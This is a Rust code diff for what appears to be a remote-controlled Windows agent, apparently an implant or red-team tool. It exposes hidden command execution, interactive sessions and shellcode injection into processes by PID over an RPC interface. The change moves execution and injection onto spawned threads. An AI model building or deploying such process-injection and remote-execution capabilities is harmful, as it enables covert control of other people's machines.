@@ -8,8 +8,8 @@ use remoc::{
     rch::bin::{self, Receiver, Sender},
     rtc,
 };
-use std::process::Stdio;
-use tokio::{io, process::Command, select};
+use std::{process::Stdio, thread};
+use tokio::{io, process::Command, select, sync::oneshot};
 use tokio_util::io::{CopyToBytes, SinkWriter, StreamReader};
 use winapi::um::winbase::CREATE_NO_WINDOW;
 
@@ -24,7 +24,13 @@ impl AgentObj {
 #[rtc::async_trait]
 impl mcprocess::Agent for AgentObj {
     async fn execute(&self, command: String, args: Vec<String>) -> AppResult<Output> {
-        Ok(ffi::execute(command, args)?.into())
+        let (tx, rx) = oneshot::channel();
+
+        thread::spawn(move || {
+            let _ = tx.send(ffi::execute(command, args));
+            Ok::<_, anyhow::Error>(())
+        });
+        Ok(rx.await??.into())
     }
 
     async fn interactive(&self, command: String) -> AppResult<(Sender, Receiver, Receiver)> {
@@ -76,10 +82,18 @@ impl mcprocess::Agent for AgentObj {
         ep_offset: u32,
         parameter: Vec<u8>,
     ) -> AppResult<()> {
-        match ffi::inject_shellcode_by_id(pid, shellcode, ep_offset, parameter)? {
-            true => Ok(()),
-            false => Err(Error::from(anyhow!("Failed to inject shellcode"))),
-        }
+        let (tx, rx) = oneshot::channel();
+
+        thread::spawn(move || {
+            let _ = tx.send(
+                match ffi::inject_shellcode_by_id(pid, shellcode, ep_offset, parameter)? {
+                    true => Ok(()),
+                    false => Err(Error::from(anyhow!("Failed to inject shellcode"))),
+                },
+            );
+            Ok::<_, anyhow::Error>(())
+        });
+        Ok(rx.await??.into())
     }
 
     async fn get_id_by_name(&self, name: String) -> AppResult<u32> {
